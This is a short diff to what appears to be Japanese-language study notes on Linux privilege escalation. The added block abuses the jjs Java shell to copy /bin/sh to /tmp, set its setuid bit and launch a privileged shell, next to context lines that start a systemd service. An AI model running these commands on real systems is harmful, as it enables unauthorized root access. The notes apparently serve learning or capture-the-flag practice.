@@ -25,6 +25,12 @@ EOF
 cd ~
 systemctl link /home/test/test.service
 systemctl start test.service
+# jjs, Runtime.Execの悪用
+jjs
+Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
+Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
+Ctrl + C
+/tmp/sh -p
 ```
 
 # tmuxとは
